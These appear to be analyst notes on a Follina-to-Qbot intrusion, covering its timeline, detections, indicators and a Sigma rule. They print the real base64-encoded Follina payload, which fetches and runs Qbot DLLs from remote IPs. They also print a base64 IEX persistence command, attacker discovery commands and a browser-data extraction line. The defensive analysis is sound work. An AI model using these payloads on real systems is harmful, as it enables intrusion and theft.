# Follina Exploit leads to Domain Compromise

Follina --> Qbot infection chain

Qbot (Qakbot/ Pinksliplot)

- Reconnaissance
- Lateral movement
- Data exfil
- delivering payloads as initial broker

In this intrusion:

- Qbot payload execution
- established C2 connectivity
- Discovery activity on beachhead host
- Pivoting to systems and installation of remote management tools such as NetSupport and Atera Agent
- used Cobaltstrike to maintain access to the network
- intrusion lasted 2 days
- interest in sensitive documents hosted on a file server

## Case summary

1. threat actor (TA) abused the CVE-2022-30190 (Follina) vulnerability
 1. expoit code in malicious word document to gain initial access
 2. likely arrived by the means of [thread-hijacked emails from distribution channels used by TA570](https://isc.sans.edu/diary/TA570+Qakbot+%28Qbot%29+tries+CVE-2022-30190+%28Follina%29+exploit+%28ms-msdt%29/28728).
3. Weaponized Word document got executed
 1. HTML file was retrieved from a remote server containing a PowerShell payload
 2. Payload contained base64-encoded content => to download Qbot DDLs inside the user's Temp directory
3. Qbot DLL executed via regsvr32.exe
 1. was then injected into legitimate processes (explorer.exe) on the host
2. Injected process spawned Windows utilities such as `whoami`, `net.exe` and `nslookup` for discovery and to establish connection to the Qbot C2 servers
3. Approx. an hour later: leverage of the Windows built-in utility `esentutl.exe` to extract browser data
4. Qbot used scheduled task creation as a persistence mechanism
 1. contained PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive.
2. TA proceeded with remote creation of Qbot DLLs over SMB to other hosts throughout the environment
3. TA added folders to the Microsoft Defender exlusions list on each of the infected machines to evade defenses
4. Remote services were then used in a similar fashion to execute the DLLs
5. Cobalt Strike server connection was witnessed within the first hour, but wasn't ustilised untill the lateral movement phase
 2. `nltest.exe` and `AdFind` were executed by the injected Cobalt Strike process (explorer.exe)
 3. also used to access the LSASS system process
4. TA installed remote management tool called `Netsupport Manager`
5. TA moved laterally to the domain controller via Remote Desktop session
6. On the DC
 1. A tool called `Atera Remote Management` was deployed (popular tool to control victim machines)
2. Next day: TA downloaded a tool named `Network Scanner` by SoftPerfect on the DC
 1. Execution ran a port scan across the network
2. TA connected to one of the file share servers via RDP and accessed sensitive documents
3. No further activity was observed before the TA got evicted from the domain.

### Timeline



### Infection graph



## Step-by-step

### Initial access

For the initial access Follina (CVE-2022-30190) was used. This vulnerability is a remote code execution vulnerability that exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights.
[Guidance for CVE-2022-30190](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/)

Delivery of the malicious Word document was linked to TA570, using hijacked email threads to deliver the initial payload.

Note: OOXML format stores associated files and folders within a compressed ZIP archive.
These can be extracted as usual. An important file for the analysis of a Follina maldoc is `document.xml.rels`
--> this "relationship" file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word doc is opened, or viewed in Preview mode

At the bottom of the retrieved HTML page, a script tag with malicious JavaScript code that called the `ms-msdt` scheme was found:
(Code is in Base64 as to not trigger Defender)

```
bXMtbXNkdDovaWQgUENXRGlhZ25vc3RpYyAvc2tpcCBmb3JjZSAvcGFyYW0gIklUX1JlYnJvd3NlRm9yRmlsZT0/IElUX0xhdW5jaE1ldGhvZD1Db250ZXh0TWVudSBJVF9Ccm93c2VGb3JGaWxlPSQoSW52b2tlLUV4cHJlc3Npb24oJChJbnZva2UtRXhwcmVzc2lvbignW1N5c3RlbS5UZXh0LkVuY29kaW5nXScrW2NoYXJdNTgrW2NoYXJdNTgrJ1VuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF0nK1tjaGFyXTU4K1tjaGFyXTU4KydGcm9tQmFzZTY0U3RyaW5nKCcrW2NoYXJdMzQKKydKQUJ3QUNBQVBRQWdBQ1FBUlFCdUFIWUFPZ0IwQUdVQWJRQndBRHNBYVFCM0FISUFJQUJvQUhRQWRBQndBRG9BTHdBdkFERUFNQUEwQUM0QU13QTJBQzRBTWdBeUFEa0FMZ0F4QURNQU9RQXZBQ1FBS0FCeUFHRUFiZ0JrQUc4QWJRQXBBQzRBWkFCaEFIUUFJQUF0QUU4QWRRQjBBRVlBYVFCc0FHVUFJQUFrQUhBQVhBQjBBQzRBUVFBN0FHa0Fkd0J5QUNBQWFBQjBBSFFBY0FBNkFDOEFMd0E0QURVQUxnQXlBRE1BT1FBdUFEVUFOUUF1QURJQU1nQTRBQzhBSkFBb0FISUFZUUJ1QUdRQWJ3QnRBQ2tBTGdCa0FHRUFkQUFnQUMwQVR3QjFBSFFBUmdCcEFHd0FaUUFnQUNRQWNBQmNBSFFBTVFBdUFFRUFPd0JwQUhjQWNnQWdBR2dBZEFCMEFIQUFPZ0F2QUM4QU1RQTRBRFVBTGdBeUFETUFOQUF1QURJQU5BQTNBQzRBTVFBeEFEa0FMd0FrQUNnQWNnQmhBRzRBWkFCdkFHMEFLUUF1QUdRQVlRQjBBQ0FBTFFCUEFIVUFkQUJHQUdrQWJBQmxBQ0FBSkFCd0FGd0FkQUF5QUM0QVFRQTdBSElBWlFCbkFITUFkZ0J5QURNQU1nQWdBQ1FBY0FCY0FIUUFMZ0JCQURzQWNnQmxBR2NBY3dCMkFISUFNd0F5QUNBQUpBQndBRndBZEFBeEFDNEFRUUE3QUhJQVpRQm5BSE1BZGdCeUFETUFNZ0FnQUNRQWNBQmNBSFFBTWdBdUFFRUEnK1tjaGFyXTM0KycpKScpKSkpaS8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9XaW5kb3dzL1N5c3RlbTMyL21wc2lnc3R1Yi5leGUi
```

When a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed by `msdt.exe` (Microsoft Support Diagnostic Tool)

***DETECTION***: monitor for this process (`msdt.exe`)  being spawned by a Microsoft Office application such as `WINWORD.EXE`

In this case: payload contained base64-encoded PowerShell code --> ***DETECTION*** decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine.

### Execution

MSDT payload
--> instance of `sdiagnhost.exe` (Scripted Diagnostics Native Host)
--> Follina payload
--> 3 child instances of `regsrv32.exe`

  ***ARTIFACT*** `PCW.debugreport.xml` in `%localappdata%\Diagnostics` after execution of Follina payload

### Persistence

1. Scheduled tasks accross multiple endpoints
(Code is in Base64 as to not trigger Defender)
```
c2NodGFza3MuZXhlIC9DcmVhdGUgL0YgL1ROICJ7RTlBREVBMzctQzMyOS00OTY3LTlDRjUtMjY4MkRBN0Q5N0JFfSIgL1RSICJjbWQgL2Mgc3RhcnQgL21pbiBcIlwiIHBvd2Vyc2hlbGwuZXhlIC1Db21tYW5kIElFWChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCBIS0NVOlxTT0ZUV0FSRVxCZW5mb3VxY2dxKS5yeGZ0ZWpraHlkbndtcHQpKSk=
```

***DETECTION*** creation of the scheduled tasks was logged in`Microsoft-Windows-TaskScheduler/Operational`

 1. Scheduled tasks referenced registry key
 2. Data in registry key consisted of base64-encoded string
 3. Decoding the the base64-encoded string revealed QBot's C2 IPv4 addresses and ports

2. `SysWow64\Explorer.exe` process was also observed cycling through a number of domains – indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR).
3. several connectivity checks were made to email relay services

### Defense Evasion
- Process hollowing - 32-bit version of explorer.exe in suspended state
- Analysis: Volatility and malfind module 
- Checking injected PIDs and Volatility netscan module --> dicovery of Qbot and Cobalt strike
- Various folders (dropzones for Qbot) were added as an exclusion for Windows Defender

### Credential access
- attempt to steal credentials from the Credentials Manager --> ***Detection*** read operation on stored credentials in Credential Manager logged in Security logs
- ***Detection*** following access levels are often linked to Credential dumping tools like Mimikatz
- ***Detection*** significant amount of volume of events by explorer process for LSASS interacions with access right: 0x1FFFFF (PROCESS_ALL_ACCESS)
```
PROCESS_VM_READ (0x0010)
PROCESS_QUERY_INFORMATION (0x0400)
PROCESS_QUERY_LIMITED_INFORMATION (0x1000)
PROCESS_ALL_ACCESS (0x1fffff)
```


### Discovery
- Discovery commands used by Qbot through injected process on beachhead system:
```
whoami /all
cmd /c set
net view /all
ipconfig /all
net share
nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN
net localgroup
netstat -nao
route print
net group /domain
net group "Domain Computers" /domain
C:\Windows\System32\cmd.exe /C c:\windows\sysnative\nltest.exe /domain_trusts /all_trusts
```

- Discovery commands from Cobalt Strike

```
net group "domain controllers" /dom
net group "domain admins" /dom
C:\Windows\system32\cmd.exe /C ping -n 1 <Redacted>
```
- `AdFind`
- Network Scaner by SoftPerfect `netscan.exe` on the Domain Controller, downloaded using IE, used to port scan on TCP 445 and 3389

### Lateral Movement
- DLLs for Qbot were sent from the beachhead host to other hosts on the network through SMB traffic
- RDP to pivot between systems on the network (DC, file server)
- ***Detection*** start of the `rdpclip.exe` by non-human account

### Collection
- QBot collection modules on beachhead modules
- `esentutl.exe` to extract browser data from IE and Edge
```
esentutl.exe /r V01 /l"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /s"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache" /d"C:\Users\<redacted>\AppData\Local\Microsoft\Windows\WebCache"
```
- `OpenWith` process for viewing PDF

### Command and Control

### Exfiltration

None observed

### Impact

Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file server using Notepad++ and Wordpad.

### Indicators

- ATERA Integrator Login ID

```
cadencefitzp.atrickzx@gmail[.]com
```

- DNS Requests

```
www.stanzatextbooks[.]com
www.framemymirror[.]com
www.coolwick[.]com
www.ajparts.co[.]uk
incredibletadoba[.]com
ibuonisani[.]it
gruposolel[.]com
foxmotorent[.]com
egofit.co[.]uk
edifica[.]ro
dwm-me[.]com
cursosfnn[.]com
cemavimx[.]com
atlasbar[.]net
```

- Qbot C2 IP’s observed in traffic

```
144[.]202[.]3[.]39:443
67[.]209[.]195[.]198:443
176[.]67[.]56[.]94:443
72[.]252[.]157[.]93:995
90[.]120[.]65[.]153:2078
72[.]252[.]157[.]93:990
86[.]97[.]9[.]190:443
37[.]34[.]253[.]233:443
23[.]111[.]114[.]52:65400
```

- Cobalt Strike

```
190[.]123[.]44[.]126:443
```

- Qbot C2 IPv4s in registry key

```
38[.]70[.]253[.]226:2222
182[.]191[.]92[.]203:995
37[.]186[.]54[.]254:995
140[.]82[.]63[.]183:443
41[.]86[.]42[.]158:995
89[.]101[.]97[.]139:443
201[.]145[.]165[.]25:443
173[.]21[.]10[.]71:2222
82[.]41[.]63[.]217:443
73[.]151[.]236[.]31:443
149[.]28[.]238[.]199:443
83[.]110[.]218[.]147:993
86[.]195[.]158[.]178:2222
120[.]61[.]1[.]114:443
140[.]82[.]49[.]12:443
86[.]97[.]9[.]190:443
92[.]132[.]172[.]197:2222
201[.]142[.]177[.]168:443
82[.]152[.]39[.]39:443
45[.]46[.]53[.]140:2222
71[.]24[.]118[.]253:443
45[.]76[.]167[.]26:443
144[.]202[.]2[.]175:995
24[.]55[.]67[.]176:443
125[.]24[.]187[.]183:443
24[.]178[.]196[.]158:2222
187[.]207[.]131[.]50:61202
78[.]101[.]193[.]241:6883
202[.]134[.]152[.]2:2222
103[.]246[.]242[.]202:443
39[.]52[.]41[.]80:995
187[.]251[.]132[.]144:22
72[.]27[.]33[.]160:443
102[.]182[.]232[.]3:995
176[.]67[.]56[.]94:443
201[.]172[.]23[.]68:2222
37[.]34[.]253[.]233:443
94[.]26[.]122[.]9:995
5[.]32[.]41[.]45:443
96[.]37[.]113[.]36:993
93[.]48[.]80[.]198:995
148[.]64[.]96[.]100:443
39[.]44[.]158[.]215:995
67[.]69[.]166[.]79:2222
45[.]63[.]1[.]12:443
31[.]48[.]174[.]63:2078
196[.]203[.]37[.]215:80
144[.]202[.]3[.]39:995
1[.]161[.]101[.]20:443
197[.]164[.]182[.]46:993
144[.]202[.]2[.]175:443
5[.]203[.]199[.]157:995
217[.]165[.]79[.]88:443
120[.]150[.]218[.]241:995
217[.]128[.]122[.]65:2222
85[.]246[.]82[.]244:443
94[.]71[.]169[.]212:995
177[.]205[.]155[.]85:443
79[.]80[.]80[.]29:2222
124[.]40[.]244[.]115:2222
106[.]51[.]48[.]170:50001
94[.]36[.]193[.]176:2222
85[.]255[.]232[.]18:443
89[.]211[.]179[.]247:2222
189[.]253[.]206[.]105:443
69[.]14[.]172[.]24:443
83[.]110[.]92[.]106:443
72[.]252[.]157[.]93:995
208[.]101[.]82[.]0:443
172[.]115[.]177[.]204:2222
174[.]69[.]215[.]101:443
74[.]14[.]5[.]179:2222
140[.]82[.]63[.]183:995
210[.]246[.]4[.]69:995
109[.]12[.]111[.]14:443
148[.]0[.]56[.]63:443
121[.]7[.]223[.]45:2222
47[.]156[.]131[.]10:443
40[.]134[.]246[.]185:995
84[.]241[.]8[.]23:32103
75[.]99[.]168[.]194:443
172[.]114[.]160[.]81:995
75[.]99[.]168[.]194:61201
108[.]60[.]213[.]141:443
217[.]165[.]176[.]49:2222
177[.]156[.]191[.]231:443
32[.]221[.]224[.]140:995
76[.]70[.]9[.]169:2222
111[.]125[.]245[.]116:995
39[.]49[.]96[.]122:995
143[.]0[.]219[.]6:995
67[.]165[.]206[.]193:993
39[.]41[.]29[.]200:995
191[.]112[.]25[.]187:443
41[.]84[.]229[.]240:443
80[.]11[.]74[.]81:2222
144[.]202[.]3[.]39:443
217[.]164[.]121[.]161:1194
89[.]86[.]33[.]217:443
201[.]242[.]175[.]29:2222
31[.]35[.]28[.]29:443
124[.]109[.]35[.]32:995
217[.]164[.]121[.]161:2222
39[.]44[.]213[.]68:995
208[.]107[.]221[.]224:443
24[.]139[.]72[.]117:443
47[.]157[.]227[.]70:443
175[.]145[.]235[.]37:443
63[.]143[.]92[.]99:995
149[.]28[.]238[.]199:995
186[.]90[.]153[.]162:2222
179[.]100[.]20[.]32:32101
190[.]252[.]242[.]69:443
47[.]23[.]89[.]60:993
90[.]120[.]65[.]153:2078
81[.]215[.]196[.]174:443
70[.]46[.]220[.]114:443
76[.]25[.]142[.]196:443
41[.]38[.]167[.]179:995
70[.]51[.]135[.]90:2222
67[.]209[.]195[.]198:443
42[.]228[.]224[.]249:2222
177[.]94[.]57[.]126:32101
104[.]34[.]212[.]7:32103
41[.]230[.]62[.]211:995
177[.]209[.]202[.]242:2222
105[.]27[.]172[.]6:443
46[.]107[.]48[.]202:443
86[.]98[.]149[.]168:2222
173[.]174[.]216[.]62:443
187[.]149[.]236[.]5:443
88[.]224[.]254[.]172:443
45[.]76[.]167[.]26:995
72[.]252[.]157[.]93:993
197[.]89[.]8[.]51:443
41[.]215[.]153[.]104:995
1[.]161[.]101[.]20:995
117[.]248[.]109[.]38:21
179[.]158[.]105[.]44:443
91[.]177[.]173[.]10:995
72[.]252[.]157[.]93:990
45[.]63[.]1[.]12:995
189[.]146[.]90[.]232:443
180[.]129[.]108[.]214:995
```

- Files

```
liidfxngjotktx.dll
5abb2c12f066ce32a0e4866fb5bb347f
dab316b8973ecc9a1893061b649443f5358b0e64
077ca8645a27c773d9c881aecf54bc409c2f8445ae8e3e90406434c09ace4bc2

doc532.docx
e7015438268464cedad98b1544d643ad
03ef0e06d678a07f0413d95f0deb8968190e4f6b
d20120cc046cef3c3f0292c6cbc406fcf2a714aa8e048c9188f1184e4bb16c93

client32.exe
f76954b68cc390f8009f1a052283a740
3112a39aad950045d6422fb2abe98bed05931e6c
63315df7981130853d75dc753e5776bdf371811bcfce351557c1e45afdd1ebfb
```

### Detections

#### Network

```
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET POLICY SMB Executable File Transfer
ET MALWARE Observed Qbot Style SSL Certificate
ET CNC Feodo Tracker Reported CnC Server group 24
ET CNC Feodo Tracker Reported CnC Server group 6
ET HUNTING Observed Let's Encrypt Certificate for Suspicious TLD (.icu)
ET INFO NetSupport Remote Admin Checkin
ET POLICY HTTP traffic on port 443 (POST)
ET POLICY NetSupport GeoLocation Lookup Request
ET INFO Splashtop Domain (splashtop .com) in TLS SNI
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET CNC Feodo Tracker Reported CnC Server group 8
ET CNC Feodo Tracker Reported CnC Server group 20
```

#### Sigma

```
title: Potential Qbot SMB DLL Lateral Movement
id: 3eaa2cee-2dfb-46e9-98f6-3782aab30f38
status: Experimental
description: Detection of potential us of SMB to transfer DLL's into the C$ folder of hosts unique to Qbot malware for purposes of lateral movement.
author: \@TheDFIRReport
date: 2022/09/12
references:
  - https://thedfirreport.com/
logsource:
  product: zeek
  service: smb_files
detection:
  selection_1:
    zeek_smb_files_path|endswith:
      - 'C$'
  selection_2:
    file_name|endswith:
      - '\.dll.cfg'
  condition: selection_1 and selection_2
falsepositives:
  - RMM Tools and Administrative activities in C$ Share.
level: medium
tags:
  - attack.lateral_movement
  - attack.t1570
```
